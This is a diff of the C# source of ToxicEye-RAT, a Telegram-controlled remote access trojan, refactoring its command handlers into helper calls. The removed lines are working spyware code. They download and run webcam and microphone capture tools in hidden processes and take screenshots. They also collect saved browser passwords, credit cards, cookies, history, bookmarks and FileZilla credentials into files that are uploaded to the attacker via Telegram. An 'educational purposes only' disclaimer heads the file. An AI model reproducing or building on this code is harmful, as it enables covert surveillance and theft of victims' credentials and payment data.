@@ -1,7 +1,7 @@
 ﻿/* 
        ^ Author    : LimerBoy
        ^ Name      : ToxicEye-RAT
-       ^ Github    : https:github.com/LimerBoy
+       ^ Github    : https://github.com/LimerBoy
 
        > This program is distributed for educational purposes only.
 */
@@ -12,7 +12,6 @@ using System.Net;
 using System.Drawing;
 using System.Threading;
 using System.Diagnostics;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
 using System.Speech.Synthesis;
 using System.Windows.Forms;
@@ -299,12 +298,9 @@ namespace TelegramRAT
                 // Webcam <camera> <delay>
                 case "WEBCAM":
                     {
-                        // Links
-                        string commandCamPATH = Environment.GetEnvironmentVariable("temp") + "\\CommandCam.exe";
-                        string commandCamLINK = "https://raw.githubusercontent.com/tedburke/CommandCam/master/CommandCam.exe";
                         // Args
                         string delay, camera;
-                        string filename = "webcam.png";
+                        
                         // Check if args exists
                         try
                         {
@@ -316,40 +312,7 @@ namespace TelegramRAT
                             delay = "4500";
                             camera = "1";
                         }
-                        // Check if CommandCam.exe file exists
-                        if (!File.Exists(commandCamPATH))
-                        {
-                            telegram.sendText("📷 Downloading CommandCam...");
-                            WebClient webClient = new WebClient();
-                            webClient.DownloadFile(commandCamLINK, commandCamPATH);
-                            telegram.sendText("📷 CommandCam loaded!");
-                        }
-                        // Log
-                        telegram.sendText($"📹 Trying create screenshot from camera {camera}");
-                        // Check if file exists
-                        if (File.Exists(filename))
-                        {
-                            File.Delete(filename);
-                        }
-                        // Create screenshot
-                        Process process = new Process();
-                        ProcessStartInfo startInfo = new ProcessStartInfo();
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.FileName = commandCamPATH;
-                        startInfo.Arguments = $"/filename \"{filename}\" /delay {delay} /devnum {camera}";
-                        process.StartInfo = startInfo;
-                        process.Start();
-                        process.WaitForExit();
-                        // Check if photo exists
-                        if (!File.Exists(filename))
-                        {
-                            telegram.sendText("📷 Webcam not found!");
-                            break;
-                        }
-                        // Send
-                        telegram.sendImage(filename);
-                        // Delete photo
-                        File.Delete(filename);
+                        utils.webcamScreenshot(delay, camera);
                         break;
                     }
                 // Microphone <seconds>
@@ -366,63 +329,13 @@ namespace TelegramRAT
                             telegram.sendText("⛔ Argument <seconds> required for microphone recording!");
                             break;
                         }
-
-                        string fmediaFILE = "fmedia.exe";
-                        string fmediaPATH = Environment.GetEnvironmentVariable("temp") + "\\fmedia\\";
-                        string fmediaLINK = "https://raw.githubusercontent.com/LimerBoy/hackpy/master/modules/audio.zip";
-                        string filename = "recording.wav";
-                        // Log
-                        telegram.sendText($"🎧 Listening microphone {time} seconds...");
-                        // Check if fmedia.exe file exists
-                        if (!File.Exists(fmediaPATH + fmediaFILE))
-                        {
-                            telegram.sendText("🎤 Downloading FMedia...");
-                            string tempArchive = fmediaPATH + "fmedia.zip";
-                            Directory.CreateDirectory(fmediaPATH);
-                            WebClient webClient = new WebClient();
-                            webClient.DownloadFile(fmediaLINK, tempArchive);
-                            System.IO.Compression.ZipFile.ExtractToDirectory(tempArchive, fmediaPATH);
-                            File.Delete(tempArchive);
-                            telegram.sendText("🎤 FMedia loaded!");
-                        }
-                        // Check if file exists
-                        if (File.Exists(filename))
-                        {
-                            File.Delete(filename);
-                        }
-
-                        // Record audio
-                        Process process = new Process();
-                        ProcessStartInfo startInfo = new ProcessStartInfo();
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.FileName = fmediaPATH + fmediaFILE;
-                        startInfo.Arguments = $"--record --until={time} -o {filename}";
-                        process.StartInfo = startInfo;
-                        process.Start();
-                        process.WaitForExit();
-                        // Check if recording exists
-                        if (!File.Exists(filename))
-                        {
-                            telegram.sendText("🎤 Microphone not found!");
-                            break;
-                        }
-                        // Send
-                        telegram.sendVoice(filename);
-                        // Delete recording
-                        File.Delete(filename);
+                        utils.recordMircophone(time);
                         break;
                     }
                 // Desktop
                 case "DESKTOP":
                     {
-                        string filename = "screenshot.png";
-                        var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
-                        var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
-                        gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
-                        bmpScreenshot.Save(filename, System.Drawing.Imaging.ImageFormat.Png);
-                        telegram.sendImage(filename);
-                        // Delete photo
-                        File.Delete(filename);
+                        utils.desktopScreenshot();
                         break;
                     }
                 // Keylogger
@@ -591,115 +504,46 @@ namespace TelegramRAT
                 // GetPasswords
                 case "GETPASSWORDS":
                     {
-                        string filename = "passwords.txt";
-                        string output = "[PASSWORDS]\n\n";
-                        var passwords = Passwords.get();
-                        foreach (Dictionary<string, string> data in passwords)
-                        {
-                            output += "HOSTNAME: " + data["hostname"] + "\n"
-                                   + "USERNAME: " + data["username"] + "\n"
-                                   + "PASSWORD: " + data["password"] + "\n"
-                                   + "\n";
-                        }
-                        File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename, true);
+                        Passwords.get();
                         break;
                     }
                 // GetCreditCards
                 case "GETCREDITCARDS":
                     {
-                        string filename = "credit_cards.txt";
-                        string output = "[CREDIT CARDS]\n\n";
-                        var credit_cards = CreditCards.get();
-                        foreach (Dictionary<string, string> data in credit_cards)
-                        {
-                            output += "NUMBER: " + data["number"] + "\n"
-                                   + "NAME: " + data["name"] + "\n"
-                                   + "EXPIRE_YEAR: " + data["expireYear"] + "\n"
-                                   + "EXPIRE_MONTH: " + data["expireMonth"] + "\n"
-                                   + "\n";
-                        }
-                        File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename, true);
+                        CreditCards.get();
                         break;
                     }
                 // GetHistory
                 case "GETHISTORY":
                     {
-                        string filename = "history.txt";
-                        string output = "[HISTORY]\n\n";
-                        var history = History.get();
-                        foreach (Dictionary<string, string> data in history)
-                        {
-                            output += "URL: " + data["url"] + "\n"
-                                   + "TITLE: " + data["title"] + "\n"
-                                   + "VISITS: " + data["visits"] + "\n"
-                                   + "DATE: " + data["time"] + "\n"
-                                   + "\n";
-                        }
-                        File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename, true);
+                        History.get();
                         break;
                     }
                 // GetBookmarks
                 case "GETBOOKMARKS":
                     {
-                        string filename = "bookmarks.txt";
-                        string output = "[BOOKMARKS]\n\n";
-                        var bookmarks = Bookmarks.get();
-                        foreach (Dictionary<string, string> data in bookmarks)
-                        {
-                            output += "URL: " + data["url"] + "\n"
-                                   + "NAME: " + data["name"] + "\n"
-                                   + "DATE: " + data["date_added"] + "\n"
-                                   + "\n";
-                        }
-                        File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename, true);
+                        
+                        Bookmarks.get();
                         break;
                     }
                 // GetCookies
                 case "GETCOOKIES":
                     {
-                        string filename = "cookies.txt";
-                        string output = "[COOKIES]\n\n";
-                        var bookmarks = Cookies.get();
-                        foreach (Dictionary<string, string> data in bookmarks)
-                        {
-                            output += "VALUE: " + data["value"] + "\n"
-                                   + "HOST: " + data["hostKey"] + "\n"
-                                   + "NAME: " + data["name"] + "\n"
-                                   + "PATH: " + data["path"] + "\n"
-                                   + "EXPIRE: " + data["expires"] + "\n"
-                                   + "SECURE: " + data["isSecure"] + "\n"
-                                   + "\n";
-                        }
-                        File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename, true);
+                        
+                        Cookies.get();
                         break;
                     }
                 // GetDesktop
                 case "GETDESKTOP":
                     {
-                        telegram.sendText("📦 Archiving desktop files...");
                         GrabDesktop.get();
                         break;
                     }
                 // GetFileZilla
                 case "GETFILEZILLA":
                     {
-                        string filename = "filezilla.txt";
-                        string output = "[FILEZILLA SERVERS]\n\n";
-                        var filezilla = FileZilla.get();
-                        foreach (Dictionary<string, string> data in filezilla)
-                        {
-                            output += "URL: " + data["url"] + "\n"
-                                   + "USERNAME: " + data["username"] + "\n"
-                                   + "PASSWORD: " + data["password"] + "\n"
-                                   + "\n";
-                        }
-                        File.WriteAllText(filename, output);
-                        telegram.UploadFile(filename, true);
+                        
+                        FileZilla.get();
                         break;
                     }
                 // GetDiscord
